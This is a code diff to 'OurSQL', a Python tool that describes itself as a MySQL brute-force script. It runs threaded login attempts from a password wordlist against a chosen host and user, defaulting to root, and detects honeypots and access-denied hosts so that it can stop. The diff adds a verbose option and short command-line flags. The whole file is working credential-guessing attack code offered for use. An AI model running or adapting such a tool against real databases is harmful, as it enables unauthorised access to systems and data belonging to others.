@@ -13,6 +13,7 @@ from threading import Thread, activeCount
 status = False
 allowed = True
 honeypot = False
+verbose = False
 
 # Get current time in formatted form.
 def curTime():
@@ -48,7 +49,7 @@ def file_exists(parser, file):
 	return [x.strip() for x in open(file)]
 
 def connect(host, user, password, port):
-	global status, allowed, honeypot
+	global status, allowed, honeypot, verbose
 	try:
 		conn = MySQLdb.connect(host=host, port=port, user=user, password=password, connect_timeout=3)
 		showSuccess("Login Success! {} : {}".format(user, password))
@@ -56,13 +57,12 @@ def connect(host, user, password, port):
 	except Exception as e:
 		errno, message = e.args
 		if errno == 2013:
-			showFailure("Comrade! {}:{} is probably western spy trap (honeypot) !".format(host, port))
 			honeypot = True
 		if errno == 1130:
-			showFailure("Comrade! Host {}:{} doesn't allow us to access user {}".format(host, port, user))
 			allowed = False
 		else:
-			showFailure("Login failed {} : {}".format(user, password))
+			if verbose:
+				showFailure("Login failed {} : {}".format(user, password))
 
 def exitScript():
 	showInfo("Exiting OurSQL...")
@@ -70,21 +70,23 @@ def exitScript():
 
 def main(args):
 	try:
-		global status, allowed
+		global status, allowed, verbose
 		user = args.user
 		port = args.port
 		host = args.host
+		verbose = args.verbose
 		max_threads = args.thread
 		showInfo("Targeting {}:{}".format(host, port))
+		showInfo("Starting brute force")
 		for password in args.passwords:
 			if status:
 				showSuccess("Successfully made their MySQL to OurSQL!")
 				exitScript()
 			if not allowed:
-				showFailure("Ah... blyat!")
+				showFailure("Comrade! Host {}:{} doesn't allow us to access user {}".format(host, port, user))
 				exitScript()
 			if honeypot:
-				showFailure("Ah... blyat!")
+				showFailure("Comrade! {}:{} is probably western spy trap (honeypot) !".format(host, port))
 				exitScript()
 			th = Thread(target=connect, args=(host, user, password, port))
 			th.daemon = True
@@ -103,11 +105,12 @@ if __name__ == "__main__":
 		showBanner()
 		desc = "MySQL Brute force script. Some says that KGB used this script during cold war."
 		args = argparse.ArgumentParser(description=desc)
-		args.add_argument("--pass", dest="passwords", type=lambda x: file_exists(args, x), required=True, help="The passwords file")
-		args.add_argument("--host", dest="host", type=str, required=True, help="The DBMS IP or domain")
-		args.add_argument("--port", dest="port", type=int, default=3306, help="The DBMS Port (Default: 3306)")
-		args.add_argument("--user", dest="user", type=str, default="root", help="The DBMS username (Default: root)")
-		args.add_argument("--thread", dest="thread", type=int, default=3, help="The number of threads (Defaut: 3)")
+		args.add_argument("-p", "--pass", dest="passwords", type=lambda x: file_exists(args, x), required=True, help="The passwords file")
+		args.add_argument("-H", "--host", dest="host", type=str, required=True, help="The DBMS IP or domain")
+		args.add_argument("-P", "--port", dest="port", type=int, default=3306, help="The DBMS Port (Default: 3306)")
+		args.add_argument("-u", "--user", dest="user", type=str, default="root", help="The DBMS username (Default: root)")
+		args.add_argument("-t", "--thread", dest="thread", type=int, default=3, help="The number of threads (Defaut: 3)")
+		args.add_argument("-v", "--verbose", dest="verbose", action="store_true", help="Show all login attempt message")
 		args = args.parse_args()
 		showInfo("Starting OurSQL")
 		main(args)
